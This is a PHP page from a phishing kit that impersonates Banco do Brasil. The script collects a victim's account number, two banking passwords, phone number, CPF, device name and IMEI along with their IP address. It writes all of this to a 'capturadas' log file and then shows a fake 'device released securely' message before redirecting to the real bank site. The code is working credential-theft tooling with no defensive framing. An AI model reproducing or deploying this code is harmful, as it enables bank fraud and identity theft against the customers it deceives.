<?php

session_start();

error_reporting(1);
ini_set("display_errors", 1 );

session_start();

date_default_timezone_set('America/Sao_Paulo');

$hora = date('H:i:s');
$data = date('d/m');

$ip = $_SERVER["REMOTE_ADDR"];

if (preg_match('|MSIE ([0-9].[0-9]{1,2})|',$useragent,$matched)) {
   $browser_version=$matched[1];
   $browser = 'IE';
}
elseif (preg_match( '|Opera/([0-9].[0-9]{1,2})|',$useragent,$matched)) {
   $browser_version=$matched[1];
   $browser = 'Opera';
}
elseif(preg_match('|Firefox/([0-9\.]+)|',$useragent,$matched)) {
   $browser_version=$matched[1];
   $browser = 'Firefox';
}
elseif(preg_match('|Chrome/([0-9\.]+)|',$useragent,$matched)) {
   $browser_version=$matched[1];
   $browser = 'Chrome';
}
elseif(preg_match('|Safari/([0-9\.]+)|',$useragent,$matched)) {
   $browser_version=$matched[1];
   $browser = 'Safari';
}
else {
    $browser_version = 0;
    $browser= 'desconhecido¿';
}

$imei = $_POST["imei"];
$dispositivo = $_POST["dispositivo"];
$agencia = $_SESSION["agencia"];
$conta = $_SESSION["conta"];
$senha8 = $_SESSION["senha8"];
$senha6 = $_SESSION["senha6"];
$telefone = $_SESSION["telefone"];
$cpf = $_SESSION["cpf"];

$conteudo = "Chegou: $hora - $data#Conta: $conta#Senha(8): $senha8#Senha(6): $senha6#Telefone: $telefone#CPF: $cpf#Dispositivo: $dispositivo#IMEI: $imei#IP: $ip";

$todas_info = explode("\n", file_get_contents("admin/capturadas_1533_.txt"));

$arq1 = fopen("admin/capturadas_1533_.txt", "w");
fwrite($arq1, $conteudo."\n");
fclose($arq1);

$arq2 = fopen("admin/capturadas_1533_.txt", "a+");

for ($nn = 0; $nn < count($todas_info); $nn++){
   fwrite($arq2, $todas_info[$nn]."\n");
}

fclose($arq2);

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="theme-color" content="#fff200">
	<meta name="apple-mobile-web-app-status-bar-style" content="#fff200">
	<meta name="msapplication-navbutton-color" content="#fff200">
	<meta http-equiv="refresh" content=14;url="http://www.bb.com.br/pbb/pagina-inicial/bb-no-celular#/">
	<title>Acesso - Dispositivo Liberado!</title>
	<link rel="stylesheet" href="_styles/home.css">
</head>
<body>
<div class="container bg-loading main_loading">
	<div class="content main_loading_one">
		<img src="_images/logo.png">
		<span>
			O acesso deste dispositivo a sua conta BB está liberado e configurado com segurança!
			<br><br>
			A partir de agora, você pode acessar sua conta BB a partir deste dispositivo usando nosso APP.
			<br><br>
			Aguarde, em alguns segundos você será redirecionado...
		</span>
		<img src="_images/ajax-loader.gif">
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->
</body>
</html>
<?php
ob_end_flush();
?>
